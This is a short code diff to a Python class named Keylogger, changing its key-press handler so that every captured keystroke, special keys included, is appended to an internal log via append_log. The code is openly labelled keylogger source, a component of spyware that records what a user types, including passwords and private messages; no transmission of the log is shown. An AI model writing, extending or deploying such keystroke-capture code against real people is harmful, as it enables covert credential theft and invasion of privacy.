@@ -22,7 +22,9 @@ class Keylogger:
             getKey = str(key.char)
             print(getKey)
         except AttributeError:
-            pass
+            getKey = ''
+
+        self.append_log(getKey)
 
     def append_log(self, newmsg):
         self.log += newmsg
